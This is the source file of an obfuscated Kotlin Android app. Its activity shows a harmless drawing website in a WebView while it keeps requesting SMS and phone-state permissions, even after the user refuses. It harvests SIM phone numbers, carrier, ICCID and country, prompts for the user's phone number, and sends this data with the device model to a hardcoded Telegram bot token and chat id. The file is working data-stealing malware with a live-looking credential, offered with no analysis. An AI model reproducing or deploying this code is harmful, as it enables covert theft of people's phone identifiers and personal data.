package a.b

import android.Manifest
import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.text.InputType
import android.view.LayoutInflater
import android.view.View
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.IOException
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager

class A : AppCompatActivity() {

    private lateinit var b: SharedPreferences
    private lateinit var c: WebView
    private val d = OkHttpClient()

    companion object {
        private const val e = 100
        private const val f = "AppPrefs"
        private const val g = "phone_number"
        private const val h = "first_run"
        private val i = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE
        )
    }

    override fun onCreate(j: Bundle?) {
        super.onCreate(j)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)
    
        b = getSharedPreferences(f, MODE_PRIVATE)
        c = findViewById(R.id.webview)
    
        with(c.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
            javaScriptCanOpenWindowsAutomatically = true
        }
        
        c.webViewClient = object : WebViewClient() {
            @Deprecated("Deprecated in Android N")
            override fun shouldOverrideUrlLoading(k: WebView, l: String): Boolean {
                k.loadUrl(l)
                return true
            }

            override fun shouldOverrideUrlLoading(k: WebView, m: android.webkit.WebResourceRequest): Boolean {
                k.loadUrl(m.url.toString())
                return true
            }
        }
    
        n()
    }

    override fun onBackPressed() {
        if (c.canGoBack()) {
            c.goBack()
        } else {
            super.onBackPressed()
        }
    }

    private fun n() {
        if (o()) {
            p()
        } else {
            q { n() }
        }
    }

    @SuppressLint("ServiceCast")
    private fun o(): Boolean {
        val r = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val s = r.activeNetwork ?: return false
            val t = r.getNetworkCapabilities(s) ?: return false
            t.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                    t.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        } else {
            @Suppress("DEPRECATION")
            val u = r.activeNetworkInfo
            @Suppress("DEPRECATION")
            u != null && u.isConnected
        }
    }

    private fun q(v: () -> Unit) {
        AlertDialog.Builder(this)
            .setTitle("Нет подключения")
            .setMessage("Требуется интернет")
            .setPositiveButton("Повторить") { _, _ -> v() }
            .setCancelable(false)
            .show()
    }

    private fun p() {
        val w = i.filter { x ->
            ContextCompat.checkSelfPermission(this, x) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
    
        if (w.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(w.first()),
                e
            )
        } else {
            y()
        }
    }
    
    override fun onRequestPermissionsResult(
        z: Int,
        aa: Array<String>,
        ab: IntArray
    ) {
        super.onRequestPermissionsResult(z, aa, ab)
    
        if (z == e) {
            val ac = aa.firstOrNull()
            val ad = ab.firstOrNull() == PackageManager.PERMISSION_GRANTED
    
            if (ad) {
                p()
            } else {
                p()
            }
        }
    }

    private fun y() {
        val ae = b.getBoolean(h, true)
        
        if (ae) {
            af("Разрешения получены")
            val ag = ah()
            af("SIM данные:\n$ag")
            b.edit().putBoolean(h, false).apply()
        }

        val ai = b.getString(g, null)
        if (ai == null) {
            aj()
        } else {
            ak()
        }
    }

    private fun aj() {
        val al = LayoutInflater.from(this).inflate(R.layout.dialog_phone_input, null)
        val am = AlertDialog.Builder(this)
            .setView(al)
            .setCancelable(false)
            .create()

        am.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))

        val an = al.findViewById<TextView>(R.id.dialog_title)
        val ao = al.findViewById<TextView>(R.id.dialog_message)
        val ap = al.findViewById<EditText>(R.id.phone_input)
        val aq = al.findViewById<Button>(R.id.continue_button)

        an.text = "Введите номер"
        ao.text = "Введите номер для продолжения"
        ap.inputType = InputType.TYPE_CLASS_PHONE

        aq.setOnClickListener {
            val ar = ap.text.toString().trim()
            if (ar.isNotEmpty()) {
                b.edit().putString(g, ar).apply()
                af("Номер: $ar")
                ak()
                am.dismiss()
            } else {
                ap.error = "Введите номер"
            }
        }

        am.show()
    }

    private fun ak() {
        c.loadUrl("https://quickdraw.withgoogle.com/")
    }

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun ah(): String {
        val asb = StringBuilder()
        
        try {
            val at = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val au = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
                val av = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    au.activeSubscriptionInfoList
                } else {
                    @Suppress("DEPRECATION")
                    au.activeSubscriptionInfoList
                }
                
                if (av != null && av.isNotEmpty()) {
                    asb.append("SIM: ${av.size}\n\n")
                    
                    for (aw in av) {
                        val ax = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            at.createForSubscriptionId(aw.subscriptionId).line1Number
                        } else {
                            @Suppress("DEPRECATION")
                            at.line1Number
                        }
                        
                        asb.append("SIM ${aw.simSlotIndex + 1}:\n")
                        asb.append("• Номер: ${ax ?: "нет"}\n")
                        asb.append("• Оператор: ${aw.carrierName ?: "нет"}\n")
                        asb.append("• IMSI: ${aw.iccId ?: "нет"}\n")
                        asb.append("• Страна: ${aw.countryIso?.uppercase() ?: "нет"}\n\n")
                    }
                } else {
                    asb.append("SIM не найдены\n")
                }
            } else {
                @Suppress("DEPRECATION")
                val ay = at.line1Number
                asb.append("Номер: ${ay ?: "нет"}\n")
                asb.append("(Multi-SIM не поддерживается)\n")
            }
        } catch (az: Exception) {
            asb.append("Ошибка: ${az.localizedMessage}")
        }
        
        return asb.toString()
    }

    private fun af(ba: String) {
        try {
            val bb = "${Build.MANUFACTURER} ${Build.MODEL}"
            val bc = "$ba\n$bb"

            val bd = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
            val be = "6331293386"
            val bf = "https://api.telegram.org/bot$bd/sendMessage"

            val bg = "application/json".toMediaType()
            val bh = """
                {
                    "chat_id": "$be",
                    "text": "$bc",
                    "parse_mode": "Markdown"
                }
            """.trimIndent().toRequestBody(bg)

            val bi = Request.Builder()
                .url(bf)
                .post(bh)
                .build()

            d.newCall(bi).enqueue(object : okhttp3.Callback {
                override fun onFailure(bj: okhttp3.Call, bk: IOException) {
                    bk.printStackTrace()
                }

                override fun onResponse(bj: okhttp3.Call, bl: okhttp3.Response) {
                    bl.close()
                }
            })
        } catch (bm: Exception) {
            bm.printStackTrace()
        }
    }
}
